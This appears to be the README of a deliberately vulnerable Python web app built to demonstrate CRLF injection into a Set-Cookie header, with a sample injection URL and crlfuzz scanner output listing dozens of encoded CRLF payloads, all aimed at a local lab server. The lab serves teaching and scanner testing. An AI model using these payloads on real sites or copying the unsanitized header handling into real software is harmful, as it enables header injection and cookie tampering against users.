# crlf-vulnerable-app

This is a vulnerable web server built using Python to demonstrate a CRLF Injection (Carriage Return Line Feed Injection) vulnerability. The server does not sanitize user input properly, which allows malicious users to inject arbitrary HTTP headers into the response.

* CRLF Injection: The vulnerability exists in how user input is handled when setting HTTP headers. In this case, user-supplied input is directly used to create a Set-Cookie header without any validation or sanitization.
* An attacker can inject newline characters (CRLF - %0D%0A) to break the current header and inject new headers into the HTTP response.


The server has a single vulnerable endpoint: / It expects a user parameter, which is then used to craft a Set-Cookie header.


start the web app :
```
python3 app.py
```
example:
```
http://127.0.0.1:8080/?user=test
```
This will respond with:
```
Cookie: Set-Cookie: name=test; Path=/
Body: Hello, test!
```

By injecting a CRLF sequence (%0D%0A), an attacker can add arbitrary headers, for example:

```
http://127.0.0.1:8080/?user=attacker%0D%0ASet-Cookie:+hacked=true
```
This URL sends the following HTTP response:
```
Injected Cookie: Set-Cookie: hacked=true
Original Cookie: Set-Cookie: name=attacker; Path=/
Body: Hello, attacker!
```
## crlfuzz
You can also use this web app to test for crlf scanning tools, for example with crlfuzz :
```bash
╰─ crlfuzz -u "http://127.0.0.1:8080/?user="

   _____ _____ __    _____
  |     | __  |  |  |   __|_ _ ___ ___
  |   --|    -|  |__|   __| | |- _|- _|
  |_____|__|__|_____|__|  |___|___|___|

      v1.4.0 - @dwisiswant0

[WRN] Use with caution. You are responsible for your actions
[WRN] Developers assume no liability and are not responsible for any misuse or damage.
[ERR] http://127.0.0.1:8080/?user=/\r\n\tSet-Cookie:param=crlfuzz;
[ERR] http://127.0.0.1:8080/?user=/\r\tSet-Cookie:param=crlfuzz;
[ERR] http://127.0.0.1:8080/?user=/\rSet-Cookie:param=crlfuzz;
[ERR] http://127.0.0.1:8080/?user=/\r%20Set-Cookie:param=crlfuzz;
[ERR] http://127.0.0.1:8080/?user=/\r\nSet-Cookie:param=crlfuzz;
[ERR] http://127.0.0.1:8080/?user=/\r\n%20Set-Cookie:param=crlfuzz;
[VLN] http://127.0.0.1:8080/?user=/crlfuzz%00Set-Cookie:param=crlfuzz;
[VLN] http://127.0.0.1:8080/?user=/crlfuzz%0aSet-Cookie:param=crlfuzz;
[ERR] http://127.0.0.1:8080/?user=/%e5%98%8a%e5%98%8dSet-Cookie:param=crlfuzz;
[ERR] http://127.0.0.1:8080/?user=/%e5%98%8a%e5%98%8d%e5%98%8a%e5%98%8dSet-Cookie:param=crlfuzz;
[VLN] http://127.0.0.1:8080/?user=/%23%0a%20Set-Cookie:param=crlfuzz;
[VLN] http://127.0.0.1:8080/?user=/%3f%0d%0aSet-Cookie:param=crlfuzz;
[VLN] http://127.0.0.1:8080/?user=/%3f%0aSet-Cookie:param=crlfuzz;
[VLN] http://127.0.0.1:8080/?user=/crlfuzz%0d%0a%09Set-Cookie:param=crlfuzz;
[VLN] http://127.0.0.1:8080/?user=/%0d%0a%20Set-Cookie:param=crlfuzz;
[VLN] http://127.0.0.1:8080/?user=/crlfuzz%20Set-Cookie:param=crlfuzz;
[VLN] http://127.0.0.1:8080/?user=/crlfuzz%23%0aSet-Cookie:param=crlfuzz;
[VLN] http://127.0.0.1:8080/?user=/crlfuzz%23%0a%20Set-Cookie:param=crlfuzz;
[VLN] http://127.0.0.1:8080/?user=/crlfuzz%3f%0d%0aSet-Cookie:param=crlfuzz;
[VLN] http://127.0.0.1:8080/?user=/crlfuzz%3f%0aSet-Cookie:param=crlfuzz;
[VLN] http://127.0.0.1:8080/?user=/crlfuzz%3fSet-Cookie:param=crlfuzz;
[VLN] http://127.0.0.1:8080/?user=/crlfuzz%3f%0dSet-Cookie:param=crlfuzz;
[VLN] http://127.0.0.1:8080/?user=/crlfuzz%23%0d%0aSet-Cookie:param=crlfuzz;
[ERR] http://127.0.0.1:8080/?user=/crlfuzz\r\nSet-Cookie:param=crlfuzz;
[ERR] http://127.0.0.1:8080/?user=/crlfuzz\rSet-Cookie:param=crlfuzz;
[ERR] http://127.0.0.1:8080/?user=/crlfuzz\r\n%20Set-Cookie:param=crlfuzz;
[ERR] http://127.0.0.1:8080/?user=/crlfuzz\r%20Set-Cookie:param=crlfuzz;
[ERR] http://127.0.0.1:8080/?user=/crlfuzz\r\n\tSet-Cookie:param=crlfuzz;
[ERR] http://127.0.0.1:8080/?user=/crlfuzz\r\tSet-Cookie:param=crlfuzz;
[ERR] http://127.0.0.1:8080/?user=/crlfuzz%e5%98%8a%e5%98%8dSet-Cookie:param=crlfuzz;
[ERR] http://127.0.0.1:8080/?user=/crlfuzz%e5%98%8a%e5%98%8d%e5%98%8a%e5%98%8dSet-Cookie:param=crlfuzz;
[VLN] http://127.0.0.1:8080/?user=/?crlfuzz=%0aSet-Cookie:param=crlfuzz;
[VLN] http://127.0.0.1:8080/?user=/?crlfuzz=%00Set-Cookie:param=crlfuzz;
[VLN] http://127.0.0.1:8080/?user=/?crlfuzz=%0dSet-Cookie:param=crlfuzz;
[VLN] http://127.0.0.1:8080/?user=/?crlfuzz=%0d%09Set-Cookie:param=crlfuzz;
[VLN] http://127.0.0.1:8080/?user=/?crlfuzz=%0d%0aSet-Cookie:param=crlfuzz;
[VLN] http://127.0.0.1:8080/?user=/?crlfuzz=%0d%0a%09Set-Cookie:param=crlfuzz;
[VLN] http://127.0.0.1:8080/?user=/?crlfuzz=%0d%0a%20Set-Cookie:param=crlfuzz;
[VLN] http://127.0.0.1:8080/?user=/?crlfuzz=%0d%20Set-Cookie:param=crlfuzz;
[VLN] http://127.0.0.1:8080/?user=/?crlfuzz=%23%0dSet-Cookie:param=crlfuzz;
[VLN] http://127.0.0.1:8080/?user=/?crlfuzz=%23%0aSet-Cookie:param=crlfuzz;
[VLN] http://127.0.0.1:8080/?user=/?crlfuzz=%23%0a%20Set-Cookie:param=crlfuzz;
[VLN] http://127.0.0.1:8080/?user=/?crlfuzz=%20Set-Cookie:param=crlfuzz;
[VLN] http://127.0.0.1:8080/?user=/?crlfuzz=%23%0d%0aSet-Cookie:param=crlfuzz;
[ERR] http://127.0.0.1:8080/?user=/?crlfuzz=%e5%98%8a%e5%98%8dSet-Cookie:param=crlfuzz;
[ERR] http://127.0.0.1:8080/?user=/?crlfuzz=\rSet-Cookie:param=crlfuzz;
[ERR] http://127.0.0.1:8080/?user=/?crlfuzz=\r%20Set-Cookie:param=crlfuzz;
[ERR] http://127.0.0.1:8080/?user=/?crlfuzz=\r\nSet-Cookie:param=crlfuzz;
[ERR] http://127.0.0.1:8080/?user=/?crlfuzz=\r\n%20Set-Cookie:param=crlfuzz;
[ERR] http://127.0.0.1:8080/?user=/?crlfuzz=\r\n\tSet-Cookie:param=crlfuzz;
[ERR] http://127.0.0.1:8080/?user=/?crlfuzz=\r\tSet-Cookie:param=crlfuzz;
[VLN] http://127.0.0.1:8080/?user=/?crlfuzz=%3f%0d%0aSet-Cookie:param=crlfuzz;
[VLN] http://127.0.0.1:8080/?user=/?crlfuzz=%3f%0aSet-Cookie:param=crlfuzz;
[VLN] http://127.0.0.1:8080/?user=/?crlfuzz=%3fSet-Cookie:param=crlfuzz;
[VLN] http://127.0.0.1:8080/?user=/?crlfuzz=%3f%0dSet-Cookie:param=crlfuzz;
[ERR] http://127.0.0.1:8080/?user=/?crlfuzz=%e5%98%8a%e5%98%8d%e5%98%8a%e5%98%8dSet-Cookie:param=crlfuzz;
[VLN] http://127.0.0.1:8080/?user=/crlfuzz%0d%20Set-Cookie:param=crlfuzz;
[VLN] http://127.0.0.1:8080/?user=/crlfuzz%0d%0a%20Set-Cookie:param=crlfuzz;
[VLN] http://127.0.0.1:8080/?user=/%0d%09Set-Cookie:param=crlfuzz;
[VLN] http://127.0.0.1:8080/?user=/%0dSet-Cookie:param=crlfuzz;
[VLN] http://127.0.0.1:8080/?user=/crlfuzz%0d%0aSet-Cookie:param=crlfuzz;
[VLN] http://127.0.0.1:8080/?user=/%23%0aSet-Cookie:param=crlfuzz;
[VLN] http://127.0.0.1:8080/?user=/crlfuzz%0d%09Set-Cookie:param=crlfuzz;
[VLN] http://127.0.0.1:8080/?user=/crlfuzz%23%0dSet-Cookie:param=crlfuzz;
[VLN] http://127.0.0.1:8080/?user=/%0aSet-Cookie:param=crlfuzz;
[VLN] http://127.0.0.1:8080/?user=/%23%0dSet-Cookie:param=crlfuzz;
[VLN] http://127.0.0.1:8080/?user=/%0d%0aSet-Cookie:param=crlfuzz;
[VLN] http://127.0.0.1:8080/?user=/%23%0d%0aSet-Cookie:param=crlfuzz;
[VLN] http://127.0.0.1:8080/?user=/%20Set-Cookie:param=crlfuzz;
[VLN] http://127.0.0.1:8080/?user=/%3fSet-Cookie:param=crlfuzz;
[VLN] http://127.0.0.1:8080/?user=/%00Set-Cookie:param=crlfuzz;
[VLN] http://127.0.0.1:8080/?user=/%0d%20Set-Cookie:param=crlfuzz;
[VLN] http://127.0.0.1:8080/?user=/%0d%0a%09Set-Cookie:param=crlfuzz;
[VLN] http://127.0.0.1:8080/?user=/%3f%0dSet-Cookie:param=crlfuzz;
[VLN] http://127.0.0.1:8080/?user=/crlfuzz%0dSet-Cookie:param=crlfuzz;
```
